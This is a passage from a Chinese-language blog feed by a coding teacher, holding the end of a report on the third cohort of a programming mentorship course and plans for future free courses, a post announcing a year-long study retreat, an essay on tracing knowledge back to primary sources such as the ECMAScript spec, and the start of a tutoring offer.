title="「缺點」"></a>「缺點」</h4><p>如果要找出自己的課程跟其他的最大的不同，我會說是「缺點」。</p><p>臉書上很常被推到程式教學相關的廣告，冷門的熱門的我幾乎都看過了，看過他們的網站，看過教學內容，看過學員評價，全部都看了。發現了一個共通點，就是：「看起來好像都很厲害」。</p><p>可是只有我覺得這樣很奇怪嗎？</p><p>就有種…看起來很不真實的感覺。對外把課程講得多好多好，優點一大堆，可是缺點呢？可是壞的一面呢？總不可能你覺得自己的課程已經完美了吧？</p><p>我能理解很多人不會把這一面透露在外，對外的形象一定要是完美無缺的，好像這個課程就是真的 100 分那樣。有些人可能認為把壞的那一面透露在外是不好的，但我不這麼認為。</p><p>我想做的就是把課程攤開來，誠實地跟你說我覺得這邊我做得很好，那邊做得很差。我不在乎你看完課程的檢討或是學員的負面心得之後是不是就不想來上這個課程了，我覺得這不是我能也不是我該決定的。我把好的壞的都跟你說了，剩下要不要來是你的選擇。</p><p>這是我想做到的。</p><h4 id="學生自助餐"><a href="#學生自助餐" class="headerlink" title="學生自助餐"></a>學生自助餐</h4><p>這個詞我在<a href="/2019/11/10/about-interview-95bfaa4273ba/">隨意談看學生求職心得感想</a>裡面有提到過：</p><blockquote><p><em>因為如果是這樣的話，很容易就會造成「學生自助餐」，外面表現不好的學生一律切割，說那都是他們的問題；表現好的就通通把功勞攬在自己身上，說這都是自己厲害。</em></p></blockquote><p>以前在學生時代，相信大家多少都有碰過會依據成績高低而大小眼的老師。成績好的同學做什麼都可以，成績不好的同學做什麼都錯。那時候完全不理解為什麼會有如此的差別待遇，但在教了愈來愈多學生之後，多少可以體會為什麼老師比較喜愛成績好的學生。</p><p>第一，成績好的學生會讓老師花比較少時間回答問題，減輕老師的工作量。例如說成績好的能夠問出一個好問題，回答後也一點就通，身為老師就不用花很多時間在他們身上。</p><p>第二，成績好的學生會讓老師有種「自己教得真好」的錯覺。會說是錯覺是因為成績不好的學生明明也是自己教出來的，這個錯覺也是學生自助餐的另一種展現。</p><p>所以成績優秀的學生既可以幫老師省時間，又可以帶來成就感。</p><p>但我沒有說這樣是對的，我只是觀察到了這個現象然後跟大家分享而已，我不認為成績不同的學生就可以差別待遇。回答問題本來就是老師的工作，如果問題問得差，那就教學生怎麼把問題問好。如果教學教得差，那就自己想辦法增進教學能力。</p><p>寫出來是為了警剔自己，不要成為這種老師。</p><h4 id="如果還有下一期"><a href="#如果還有下一期" class="headerlink" title="如果還有下一期"></a>如果還有下一期</h4><p>雖然短期內應該是不會有下一期了（理由下面會講到），但還是可以來整理一下之後可以改進的東西，要開下一期的時候就能快速參考。</p><p>第一，如同前面在講基礎那邊所提到的，可以考慮把課程大轉向，不教前後端也不教這些工具了。我想回歸到最原始的狀態，讓學生能學會「寫程式」這件事。</p><p>我可能一樣會從 JavaScript 開始教程式基礎，然後開始帶學生寫一些水題，就那種 ACM 一星題之類的，接著可以做一大堆應用類的小作品，例如說寫個爬蟲，寫個五子棋，寫個猜數字之類的，讓學生們覺得自己是可以寫 code 的。</p><p>課程時長可能會縮短成三個月，不要以為這樣很長，我覺得這樣搞不好都還不夠。不過如果課程真的轉向有些問題需要解決，第一是如果還是要求學生每週付出 40 小時，還剩多少人有這意願？第二是如果不以求職做為收費標準了，那學費該怎麼算？</p><p>如果真的要改做這個，我覺得我應該會想優先做成免費的線上課程吧，但細節還要再想想就是了。</p><p>第二，若是沒轉向而是以第三期為基礎加強的話，第一點需要改的是作業以及教學的示範，要做出一個足夠大的專案，常見的例如說論壇跟電商網站，也可以做出像是 Medium、Twitter 之類的東西。</p><p>再來是學生寫完作業以後，應該讓他們根據我提供的指南先做第一次自我檢討，檢討完修正完才傳上來。會想這樣改是因為改作業的時候會發現很多學生犯一樣的錯，第三期我就有統整好寫下來，叫他們交完作業可以看。</p><p>可是如果交了作業才看，那我改作業的時候就不確定這些錯誤他們之後會不會修正。若是調整成寫完作業之後自己先改一遍，一來我可以省時間，二來也可以在看作業的時候知道他們有沒有先檢討過，挑出其他小錯誤就好。</p><p>也應該針對作業錄一個檢討影片，講一些常見問題，然後從頭示範一次作業給他們看。</p><p>第三，針對第三期常卡關的地方以及沒講清楚的概念做加強。其實這我已經有在做了，例如說：</p><ol><li>API 觀念不熟，寫了：<a href="/2019/06/20/ramen-and-api-6238437dc544/">從拉麵店的販賣機理解什麼是 API</a></li><li>Session 與 Cookie 搞不清楚，寫了：<a href="/2019/08/09/session-and-cookie-15e47ed838bc/">白話 Session 與 Cookie：從經營雜貨店開始</a></li><li>非同步不熟，寫了：<a href="https://github.com/aszx87410/blog/issues/49">JavaScript 中的同步與非同步（上）：先成為 callback 大師吧！</a></li></ol><p>但還是有加強的空間，尤其是非同步，應該再多加一個單元特別講。CSS 的部分也講得有點少， 要嘛自己再補充，要嘛多貼一些參考資料給他們看。在 JS 進階觀念那邊也應該多加一些應用的例子，例如說 this 到底用在哪裡？closure 用在哪裡？</p><p>第四，更貼近業界的作業</p><p>實際出去工作之後，其實很難讓你從零開始建一些什麼東西，比較常見的是維護現有的程式碼，所以需要的技能其實是快速掌握現有程式碼以及擁有修改的能力，簡單來說就是看 code 跟改 code，而不是從零開始寫 code。</p><p>針對這個，我想設計一系列作業是直接給一個專案，然後要學生去修 bug 或者是新增功能。這一定超有趣，而且優點很多，在改 code 的時候要符合原本專案的 coding style，每個人的改法可能會不同，交完作業可以互相參考學習。</p><p>不過我之前有考慮把這個獨立出來變別的計畫就是了，放在程式導師實驗計畫裡面好像會把時間拉太長，獨立似乎比較適合。</p><p>第五，改良 final project 機制。</p><p>以往 final project 都是非強制的，可做可不做，所以滿多人其實不會做的。但其實有個比較完整的作品，對於第一份工作來說在求職時滿加分的，所以我有兩個想法。</p><p>第一個想法是乾脆期末來弄個 hackathon，花兩三天讓大家聚在一起把 final project 的雛形做出來，有了起頭之後要加新功能也比較容易。</p><p>第二個想法是我自己先想好幾個專案然後跳下去帶他們做，我算是當 PM 之類的，先幫他們把規格弄好然後 wireframe 稍微畫一畫，其他功能實作都交給他們。</p><p>這樣的話應該會增加 final project 的完成率。</p><p>第六，課程相關教學影片翻新</p><p>有些第一期或第二期直播就講過的概念我有點偷懶，就直接讓學生看直播影片的存檔了，但其實這樣不太好，應該要像其他課程一樣好好規劃課程進度與課綱，錄一個完整的線上課程影片，這樣成效會好滿多的。</p><p>第七，把計畫改名</p><p>計畫名稱好長，我想改一下名字，但目前還不知道要改什麼。</p><h3 id="未來走向"><a href="#未來走向" class="headerlink" title="未來走向"></a>未來走向</h3><p>如同另外一篇文章：<a href="/2019/12/01/best-one-year-696aa373207d/">《閉關修煉，一年後見》</a>所提到的，之後我會休息一年，這一年之間 Lidemy 還是正常運作，問我問題一樣還是會回，不用擔心。我自己也有一些新課程的 idea，因為怕自己拖延症發作，所以決定在這邊先講出來：</p><ol><li><strong>CS50 輔助課程</strong>：以自己的話把 CS50 教的東西再教一遍並且做補充。以前有做過導讀，但導讀只是帶大家稍微理解，而輔助課程的目標是只看這堂課也可以完成 CS50 的作業。</li><li><a href="https://www.xojo.com/">Xojo</a> 教學課程：我自己是從 VB2005 開始入門寫程式的，過程十分愉快，拖拉式的 GUI 加上簡單的程式碼，讓我認為這比其他程式語言更適合拿來當作新手入門的教材。而 Xojo 的前身是 REALbasic，與 VB 十分類似，又是跨平台的開發工具，我想讓大家透過 Xojo 學會「寫程式」。</li><li><strong>先別急著寫 leetcode</strong>：如同我之前在<a href="https://blog.huli.tw/2019/11/01/before-start-leetcode/">《程式解題新手入門注意事項》</a>提過的，我認為對有些人來說寫 leetcode 還太早，去看演算法相關書籍也還太早。如果連印出九九乘法表都不會，那我不覺得去學 DP 跟 IDA* 對這個問題有幫助。因此我想出一堂課程帶大家寫寫「水題」，確保基本的題目都 ok，再去學那些經典演算法。</li></ol><p>以上三個課程都會是免費的，因為我自己認為這些概念很棒，很想推廣給大家，收費會讓事情變得麻煩許多。不過現在這三個課程都只有 idea 而已，連個雛形或是大綱都還沒有，若是你對以上課程很期待，歡迎填寫 <a href="https://forms.gle/TVb834BNkNk9GpbL8">Google 表單</a>，每次有回應我就會收到信，就會有種被催促的感覺，就不敢拖延了。</p><p>接著，關於程式導師實驗計畫，如同我之前說過的，目前沒有開第四期的打算。因此想要學習程式的朋友們，頂多只能買買 Lidemy 的線上課程而已。</p><p>也因為暫時沒打算開第四期，因此我決定分享一些我個人推薦的學習資源。</p><p>第一個是網頁切版以及 CSS 的相關資源，因為我個人極度不擅長這一塊，所以在我的教學中也講得比較淺。這邊推薦 Amos 大大的教學影片以及文章：<a href="https://ithelp.ithome.com.tw/articles/10228708">史上最完整的新手網頁入門學習地圖  —  金魚都懂的網頁學習路徑懶人包</a>。</p><p>第二個推薦的是<a href="https://www.hexschool.com/">六角學院</a>，但課程部份因為我沒有上過，所以無法評論。我推薦的是這個學院能夠為你帶來的資源以及社群。</p><p>無論六角的課程適不適合你，我都很推薦你買一堂課，然後加入六角這個大社群。以台灣本土的程式線上課程來說，我認為六角是做得最大、最多，也一直有在做事情的。無論是之前的時光屋或者是之後的揪團寫文章以及鐵人賽，六角一直在想辦法推陳出新，藉由一系列的活動讓學生成長。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>這一期比上一期的長度多了兩個月，但最後對於求職的成功與否似乎沒有顯著的影響。若是要說這一期最大的收穫，大概就是深刻理解到「程式基礎」這件事情的重要性。</p><p>我原本認為不用特別鍛鍊這一塊，藉由課程中的作業就可以慢慢培養，後來發現特別鍛鍊還是有其必要性，作業中能夠學到的有限。會寫網頁，不代表會寫程式，就算你用 JavaScript 加上互動式的功能了，就算會用 React 了，你也不一定會寫程式。</p><p>這部分還是要一步一步來，路才會走得比較順。就像我上面提到的一樣，以後打算出兩個免費的線上課程解決這問題，這樣子這兩門線上課程就會變程式導師實驗計畫的前置課程，必須先上過這兩堂或是通過測試才能報名前端的導師實驗計畫。</p><p>如此一來，就能確定學生都把基礎打好了，才開始學前端，我就不必再擔心程式基礎相關的問題，也能把課程定位的更明確。以後那兩堂線上課程就是給「毫無基礎的初學者」上的，而這個轉職的計畫則是給「有程式基礎的人」。</p><p>在這三期之中，我一直試著改良課程，讓「毫無基礎的初學者」也能上課，但在第三期結束以後，我認為這樣的方向或許是錯的。若是真的想要讓「所有毫無基礎的初學者」都能夠透過這個課程學習到如何當一個工程師，那勢必要把時間再拉長，然後再補充更多「基礎程式能力」。</p><p>可是一旦這樣做了，對原本就有基礎的人來說就太慢了，就變得有點拖。所以目前我認為可以嘗試的一個解法是：</p><ol><li>對毫無基礎的初學者，先教怎麼寫程式（透過 <strong>Xojo 教學課程</strong>）</li><li>再利用一些有趣的題目，培養程式邏輯思維（透過<strong>先別急著寫 leetcode</strong>）</li><li>最後才學習前端相關技能，轉職成網頁前端工程師（透過程式導師實驗計畫）</li></ol><p>簡單來說呢，我之前不是有說過程式導師實驗計畫不是一堂適合初學者的課嗎？以前我一直想讓這個計畫變成「適合初學者」，但我現在想要讓這個計畫「就是不適合初學者」，然後額外再開一堂別的課程讓初學者學會寫程式，並且學習到適合參加程式導師實驗計畫的程度。</p><p>在這八個月裡面我學到了許多，對於課程上的規劃也有了更多想法，很感謝這一期的每個學生，也感謝他們曾經寫過的心得，這些回饋都能讓課程再變得更好。</p><p>以上是第三期的成果報告外加未來走向，也算是我對第三期的心得，若是你想知道學生的心得，可以看這邊：<a href="https://github.com/Lidemy/mentor-program-3rd/issues">https://github.com/Lidemy/mentor-program-3rd/issues</a>。</p><p>感謝所有期待以及參與這個計畫的人，雖然不知道是多久以後，但我們下一期見！</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>閉關修煉，一年後見</title>
      <link href="/2019/12/02/best-one-year-696aa373207d/"/>
      <url>/2019/12/02/best-one-year-696aa373207d/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/best-one-year-696aa373207d/1__1BeqQknJ__akw8iEBcaqWig.jpeg"></p><p>以前一直認為機會來了就是要好好把握，深怕錯過了就很難等到下一個了。但追根究底，其實機會一直都在，我會害怕是因為我不夠強。如果真的夠強，哪裡都去得了。我不需要去找機會，機會自己會來找我。</p><p>我可能比我想像中的厲害，可能在這個階段就能夠錄取一些我想去的公司，可是心中的擔憂永遠不會消除，不會的東西不會因為錄取了某間公司就突然會了。很久以前缺點就擺在那裡，但我沒有想要去克服它。</p><p>從某個角度來說，其實也沒什麼關係。儘管不會這些，我還是到了現在的位置，還是在前端的領域活得很不錯。可是每當看到想去的職缺然後去查了這個職位必備的能力，總是會感到不安。我希望能有更強的自信，就需要有強大的能力在背後支撐，不用煩惱能不能錄取，只要煩惱比較想去哪間公司就好。</p><p>所以每隔一陣子就會有這種想法：「應該閉關一陣子好好修煉的」。</p><p>閉關修煉對我而言指的大概就是利用一年的時間充實自己（至於什麼是充實這因人而異），像是把自己覺得不紮實的技術基礎補強之類的。因為是閉關，所以基本上不跟外界聯絡，不然就不叫閉關了。</p><p>成功的閉關修煉就是一年以後旁人會看到一個嶄新的你。</p><p>不知道從什麼時候開始，我把閉關修煉視為一種強力特效藥，或甚至說誇張一點，改變人生的轉捩點。好像只要真的下定決心開始閉關，所有以前做不到的事就突然做得到了。例如說毅力，或者是堅持。</p><p>我自己知道這不是個好的想法，把閉關修煉視為一種解藥，只要吃下去就好了，一切就美好了。這樣天真的想法就像是小時候以為童話故事的結局就是幸福快樂的生活。</p><p>不，不是的，那的確是故事的結局，但不是真的結局。只要還活著，就不是結局，現實生活的劇情還在繼續往下寫。魔王是永遠不會被消滅的，一個倒了，就會有另外一個崛起；就像生活中碰到的困難一樣，永遠不會有盡頭。</p><p>但我還是想相信閉關修煉一次。</p><p>我知道它沒辦法根除問題（例如說我的懶惰），可是我相信閉關的這段期間，我會有很不同的改變。</p><p>有人可能會覺得這是無稽之談，平常不會做的事，只是喊個「我要閉關修煉」然後關起臉書後就會做了？原本堅持不下去的課表，就突然可以乖乖按表操課了？哪有這麼神奇的事。</p><p>可我覺得這是一個自己替自己設下的開關，或者說是一種決心的展現。萬事起頭難，若是開頭能夠做些什麼事加強自己的信心，或許會讓整件事情容易許多。就像剃頭，就像關閉臉書，昭告天下：「我要開始做某件事了，這就是我的決心」。</p><p>上一次最接近閉關修煉的時候是 2012 年三月一直到七月，升大學的指考。現在回頭看其實我滿喜歡那段時光的，過得超級規律。反正每天就是去補習班報到，但我不是去上課是去自習，我去那邊只是為了環境，環境也是很重要的。我待在家就只能是個沙發廢物，什麼都做不了。</p><p>在短時間內透過閉關修煉來大幅提升自己的實力，最後讓我考上了個台大，嚐到了甜頭。「只要能認真一段時間就能變得很強」，從基測再到指考，這樣子的想法根深蒂固的種在心裡（雖然不知道是不是只對考試有用）。</p><p>如果不知道真偽為何，就給自己一次機會去試吧，我總是這麼想的。反正失敗了就代表自己真的就是個沒有毅力的人，就算閉關修煉也沒有用，以後就不會再想這件事了。</p><p>雖然看起來我好像躍躍欲試，但其實我是害怕的。</p><p>一年欸，一年的時間並不短，我害怕技術日新月異，一年過後發現自己完全跟不上時代；我害怕跟世界脫節，一年後跟個原始人沒兩樣；我害怕閉關後發現自己真的很廢，連一直盼望的閉關修煉都救不了我。</p><p>我也曾經想過不要閉關了，閉什麼關呢，趕快出去找工作吧，反正最後一定能夠繼續出國工作，幹嘛閉關呢。或者是先試著找工作，找到以後證明自己是有實力的，不需要閉關，真的找不到才來談閉關這件事。</p><p>可是不行，這樣還是在逃避。我敢保證我下次離職時一定也會有同樣的念頭。同樣是一年，越往後面放越珍貴，二十歲的一年跟三十歲的一年是不一樣的。</p><p>趁早嘗試吧，反正結果一翻兩瞪眼，不是發現自己過了一年後一事無成，就是脫胎換骨換了一個人（到底有多神奇）。</p><p>儘管還是有點不安，但還是得去嘗試，因為我沒辦法欺騙自己。</p><p>當有一件事情每隔一陣子就跑來叩叩叩敲你門，你是無法忽略它的。你沒辦法假裝它不存在，假裝它不重要。</p><p>這心情就像是五年前我休學的時候寫的：</p><blockquote><p><em>在我心裡一直有一個聲音，一直叫我一直叫我，但是我卻選擇假裝沒聽見，繼續走著，以為自己可以一直忽視。直到有一天我終於無法欺騙自己，決定對自己誠實。</em></p></blockquote><p>閉關修煉這個決定，或許不是最好的決定</p><p>但一定是最誠實的。</p><p>總之就是這樣啦，我要來閉關一年了。</p><p>上面沒有把這期間會做什麼事寫清楚，因為我本來就沒打算寫清楚，反正一年之後就會知道我到底做了哪些事情。</p><p>雖然是閉關，但對課程的學生來說一切照舊，線上課程的問題一樣照回，所以這點不用擔心，因為這算是工作，工作不能這樣說閃就閃。短期內也會有三次必須發文的時刻，一個是十二月中的第三期結業報告，另外兩個是之前談好的合作邀約，要來寫某課程的心得。</p><p>然後部落格跟 Medium 的文章應該會持續更新，Medium 不敢保證，但部落格的技術文會繼續寫，因為這段期間不用臉書，所以如果覺得文章不錯，可以自己幫我分享到前端或者是相關社團去，我會十分感謝你。</p><p>這一年間沒意外的話是聯絡不到我的，真的想聯絡我的話可以用 email 但也不保證會回。</p><p>希望我在閉關的一年間可以有所轉變，大家掰掰，一年後見。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一知半解的感覺真差——談追根究底的理由</title>
      <link href="/2019/11/22/epistemology-8845a97e846c/"/>
      <url>/2019/11/22/epistemology-8845a97e846c/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/epistemology-8845a97e846c/0__oVyOmwG1MCe2dcnp.jpg"></p><h3 id="一知半解的感覺真差"><a href="#一知半解的感覺真差" class="headerlink" title="一知半解的感覺真差"></a>一知半解的感覺真差</h3><p>要嘛完全不知道，要嘛表現的盡量專業，卡在中間真的是感覺很差——尤其是你很清楚知道自己處於一知半解的狀態。</p><p>舉例來說，當我被問到哲學相關問題的時候，就會覺得感覺很差，因為我沒學好，所以我清楚知道自己對這些議題一知半解。我可能只對一些專有名詞跟哲學家有印象，但真正重要的內容卻完全忘記了。</p><p>比如說什麼「存在就是被感知（to be is to be perceived）」，我記得有這句話，我記得好像在哲學概論這堂課上面有學過，如果你講幾個哲學家的名字，我可能可以想起來是誰說的。</p><p>但要我解釋這句話，我只能像個普通人一樣講自己的想法，而不是那些哲學系曾經教會我的，更有系統性、更有立論基礎的答案。</p><p>每到了這種時候，都會暗自想說：「應該把哲學系唸完才對…」，但也只是這樣想而已，畢竟已經被退學很久了，要我重考一年然後再唸四年，我是絕對做不到的。</p><p>技術上也是，我也不是一開始就想要追根究底，例如說被問到什麼 JavaScript 有關的 hoisting 問題，我想說不就是跟變數提升有關嗎？就是那個 var 會被提升的現象，頂多再問個變數跟函式提升的順序。</p><p>但是當有人問你：「那原理呢？那這個 let 的範例你怎麼解釋？」的時候，會發現自己答不出來。這時候感覺就很差啊，就好像不上不下，你又不能說自己完全不懂這個議題，但也沒辦法自信地說出：「我懂 hoisting」，因為知道自己只有理解一部分而已。</p><p>若是完全不懂，就可以用學習的心態去面對，例如說有人問我：「你知道北歐神話嗎？」，我就不會感覺很差，因為我本來就不知道。</p><p>但當有人問我：「在 JavaScript 裡面 [] &#x3D;&#x3D; ![] 為什麼是 true？」的時候，我只能回答：「因為型別轉換，但我不確定明確規則」，就會覺得自己對這個主題只有一部分的理解。</p><p>有些人研究這些是因為面試會考，是因為別人跟他說「這很重要」，但我不一樣，我只是因為一知半解的感覺很差。</p><p>會造成感覺差的主因，其實是被提醒了：</p><blockquote><p>明明有學好的機會，卻不去把握</p></blockquote><p>既然都知道是型別轉換了，為什麼不乾脆去熟悉規則，去查清楚？不知道某個知識，是因為沒有看過沒有聽過，但對於某個知識一知半解，就代表曾經學過，可是沒有追根究底，沒有把握這個機會學好，才會一知半解。</p><p>這就是為什麼我後來都盡量追根究底。</p><p>因為追根究底可以帶來快樂，也帶來自信。</p><h3 id="追根究底"><a href="#追根究底" class="headerlink" title="追根究底"></a>追根究底</h3><p>追根究底有兩個好處，第一個是脫離了對於知識的不確定性。</p><p>例如說一開始透過別人的文章學習 hoisting 這個概念，獲得的是二手知識，這個知識正確的前提建立在這篇文章寫得沒錯，也建立在是否相信寫文章的這個人。</p><p>然後寫文章的這個人，也很有可能是透過別人學習的。所以很容易發生道聽途說的情況，一個錯誤的知識傳遍全網路，因為大家都是參考同一個錯誤答案。</p><p>當你追根究底，找到一個權威性的參考資料以後，你可以很自信地說出：「這絕對是正確的，因為我是看 ECMAScript specification 學習的。」</p><p>這就為什麼我的技術文章都盡量附上參考資料的出處，以及參考原典時的章節及段落，就是為了方便大家也去找原典來看。與其無條件相信我的文章，不如去找原典來佐證，確認兩者相符之後再相信我講的是對的。</p><p>第二個好處則是你掌握了知識的全貌，再也不會發生「只能答對一半」這種情況了。當別人問到你 hoisting 的問題，你就可以直接講 ECMAScript 裡面寫的敘述跟運作順序，保證是個正確答案。</p><p>上面兩個好處也會帶來自信，因為你知道自己是對的，是真的理解這個議題。</p><p>我第一次享受到追根究底的好處，應該是高一還高二的時候。</p><p>我從以前就是個不太注重成績的人（為我減少了很多的痛苦），那時有些科目被當了，可是不想重修。被當沒關係，學分沒拿到沒關係，我高中的目標只有一個，就是有畢業就好（但後來發現就算沒畢業，只拿結業證書也可以唸大學，之後就覺得沒畢業也沒差，可以唸大學就好）。</p><p>因此我就認真去研究了一下高中的畢業規則，看一下是不是一定要重修才能畢業。不查還好，一查驚為天人，得到以下的結論：</p><blockquote><p>高中三年大約修 192 個學分，只要 160 學分就可以畢業，換句話說，你可以被當 32 個學分</p></blockquote><p>當年查完之後我把心得寫在這裡：<a href="https://aszx87410.pixnet.net/blog/post/38859129">有關於成績</a>，過了這麼多年，之前意外發現在 Google 搜尋：「高中 被當」，可以在第一頁（甚至第一個）找到這一篇，看來我造福了莘莘學子，讚讚讚。</p><p>既然目標只有畢業，那就不用去重修了，只要保證自己不要被當超過 32 個學分就好。沒記錯的話，高中三年下來大概被當 30 學分左右，低空飛過，順利取得畢業證書。</p><p>也是差不多在那個時期，發現自己對於一些知識的…潔癖？對我感興趣的東西，我會很想知道它是不是真的，而不是道聽途說，以訛傳訛而來。</p><p>舉例來說，我在高中的時候就發現公民課本上面教的「一隻看不見的手」的原意根本不是什麼「市場經濟」這麼簡單。我也忘記當時為什麼會開始查這個，可能在哪邊看到有人提到，也可能我自己對於這個詞感到好奇。（延伸閱讀：<a href="http://www.econ.sinica.edu.tw/cclin/content/newsletter/contents/2013101514144813091/?MSID=2014090111223915919">【林鐘雄經濟特別專欄】「一隻看不見的手」到底是什麼「碗糕」？</a>）</p><p>總之，我後來跑去找了《國富論》，直接去看當時 Adam Smith 寫什麼，甚至還跑去找了原文的電子書對照一下。發現這個驚人的事實之後，跑去找了公民老師，開心地分享我的發現，但我也忘記當時他的反應是什麼了，大概就是嗯嗯喔喔不錯喔，從此就忘記有這件事。</p><p>畢竟不是每個人都會這樣，都會想知道知識的真確性。而且我們擁有的知識太多了，也不太可能去確認每一條知識。</p><p>就像是傳說中的伏爾泰名言：「I disapprove of what you say, but I will defend to the death your right to say it.」也不是他本人所說的一樣（<a href="https://www.ptt.cc/bbs/PublicIssue/M.1412317597.A.A66.html">參考資料1：ptt 文章</a>、<a href="https://en.wikipedia.org/wiki/Evelyn_Beatrice_Hall#cite_note-5">參考資料2：維基百科</a>，上面有附原文出處）</p><p>很多人可能會覺得說：這重要嗎？</p><p>這不是重不重要的問題，是對或錯的問題。若是你本來不知道也不想查，那完全沒問題。可是一旦你知道這是錯的以後，我覺得就應該改用正確的說法。</p><p>如同前面所說的，不可能去確認每一條知識，因此我後來只會對「思考過後覺得很奇怪」或者是「很特別」的知識去做確認，確保得到的知識是正確的。</p><p>例如之前聽到同事說<a href="https://news.ltn.com.tw/news/world/breakingnews/2362292">菲律賓不能離婚</a>，覺得滿特別的，就會特地去查一下。</p><p>對於一些常被拿來揶揄的東西，我也會試著去找原出處，看看是因為斷章取義，還是真的就是那樣。例如說我以前研究過<a href="https://www.facebook.com/permalink.php?story_fbid=1778322342185129&id=100000221410594">常見記者梗圖的真確性</a>，去看看在完整的脈絡下，蠢問題是否還是蠢問題，還是只是因為截圖的關係而已？</p><p>也曾經幫<a href="https://www.facebook.com/permalink.php?story_fbid=1286349648049070&id=100000221410594">阿基師翻案過</a>，去找當初記者會的影片，還自己打了逐字稿，證明他根本沒說過「咻的滑進摩鐵」這句話，只是八卦版鄉民捏造出來的而已。</p><p>當然，以上一些「我自以為正確的知識」也有可能只是另一種斷章取義，但我認為有多少證據說多少話，上面的記者梗圖跟阿基師翻案我都去找了最原始的資料，若是有人有更有力的證據，那歡迎打臉，我也會很開心得到了更正確的知識。</p><p>上面講的跟開頭所講的那些其實是不同層面的東西，一開始所說的那些一知半解，是「你知道自己不知道」，但後面講的這些是「你不知道自己不知道」，舉例來說，「我知道我不知道 hoisting 的運作原理」以及「我不知道原來阿基師滑進摩鐵不是他說的」。</p><p>但無論是哪一種，我都很想自信地說出「我知道」。</p><p>用這篇文章記錄一下自己對於知識的看法，也順便鼓勵大家有機會的時候可以好好檢視自己的知識。</p><p>最後我想順便提一下，其實追根究底這件事，光是「底」在哪裡就有點難界定了，舉上面講的 hoisting 為例，看規格就是底了嗎？可是如果有人問我：「那在編譯器裡面是怎麼實作的？」我可能答不出來，那到底怎樣才算是底？</p><p>我不知道，但或許這個「底」可以是動態的，我先研究到我認為的底就好，如果之後有更深的底，那再往下研究。在碰到更深的以前，都先認為自己應該追根究底了。</p>]]></content>
      
      
      <categories>
          
          <category> 學習 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 學習 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>期間限定：一對一程式家教</title>
      <link href="/2019/11/19/coding-tutor-88c960dc8bbe/"/>
      <url>/2019/11/19/coding-tutor-88c960dc8bbe/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/coding-tutor-88c960dc8bbe/0__ruYsmTVwOFEmL28I.jpg"></p><p>（2020–01–20 更新：此活動已截止）</p><p>因為個人生涯規劃的關係，近期都會待在台灣。在教學部份程式導師實驗計畫目前沒有打算要開第四期（大概再兩三週會有正式公告），但在這期間我依然想要找點教學相關的事情來做，想著想著就想到家教了。</p><p>所以這一篇就是放出「我想要當家教」這則訊息，讓有興趣找程式相關家教的朋友們可以聯絡我。接著會先講我預期中的教學會是什麼樣子，怎樣的人比較適合報名，以及期望薪資與報名方式，若是對我沒有很熟悉的人，在文末也可以看到我的工作及教學履歷。</p><h3 id="家教相關資訊"><a href="#家教相關資訊" class="headerlink" title="家教相關資訊"></a>家教相關資訊</h3><h4 id="可以教哪些東西？"><a href="#可以教哪些東西？" class="headerlink" title="可以教哪些東西？"></a>可以教哪些東西？</h4><p>我比較有把握的是前端相關的教學，例如說：</p><ol><li>React 與其生態系（Redux 或其他常用 library）教學</li><li>JavaScript（this、hoisting、prototype、scope、closure）相關教學</li><li>基礎前後端概念及實作（可參考<a href="https://github.com/Lidemy/mentor-program-3rd">第三期課綱</a>）</li></ol><p>只要是我 <a href="https://github.com/aszx87410/blog">blog</a> 有寫過的主題，都可以面對面直接再教一次。</p><p>還有一些比較沒把握，但如果你真的找不太到人，我也可以教的主題：</p><ol><li>網頁後端基礎 PHP + MySQL</li><li>網頁後端 Node.js + Express</li><li>程式解題基礎（太難的題目我不行，但如果你願意接受的話我可以跟你一起找答案然後用比較簡單的方式講解給你聽）</li></ol><h4 id="我的優點在哪裡？"><a href="#我的優點在哪裡？" class="headerlink" title="我的優點在哪裡？"></a>我的優點在哪裡？</h4><ol><li>擅長用「你的語言」跟你溝通，而不是一些外星語。我有自信可以把一些專有名詞用淺白的字眼以及貼近生活的比喻講解給你聽，讓你聽得懂，而不是有聽沒有懂。</li><li>開發經驗較全面，我寫過 Mobile（Android、一點點點點 React Native、跨平台的 Corona 跟 Titanium）、網站前端（最熟 React）與後端（PHP 跟Node.js），全面的好處就是如果你想做一個產品，我能很明確地跟你說每一端要怎麼串接，然後要注意哪些事項。</li><li>喜歡追根究底。從我寫過的文章（<a href="https://github.com/aszx87410/blog/issues/17">我遇過的最難的 Cookie 問題</a>、<a href="https://github.com/aszx87410/blog/issues/46">深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</a>）可以看出對有興趣的主題，我會想要追到很深的地方去。如果教學時碰到奇怪的 bug，我們可以一起往下深究。</li></ol><h4 id="我的缺點在哪裡？"><a href="#我的缺點在哪裡？" class="headerlink" title="我的缺點在哪裡？"></a>我的缺點在哪裡？</h4><p>有些東西如果想找我學基本上是找錯人了，要先聲明一下。</p><ol><li>設計模式我幾乎不會</li><li>測試相關的東西我只會一點點</li><li>Vue 跟 Angular 我也完全不會，而且暫時沒打算學</li><li>稍微比較新的 GraphQL 我也不會，React hooks 有看過一點但還沒認真學</li><li>資料視覺化、統計分析還有資工系本科的東西（作業系統、網路、系統程式設計等等）我也都不會</li></ol><p>但如果你想學習的是「如何學習」，我們可以一起學，然後我學完再教你。雖然說進度會比較慢，但我可以跟你分享我在學習這些我不會的主題時我是如何做的。</p><h4 id="怎樣的人適合報名？"><a href="#怎樣的人適合報名？" class="headerlink" 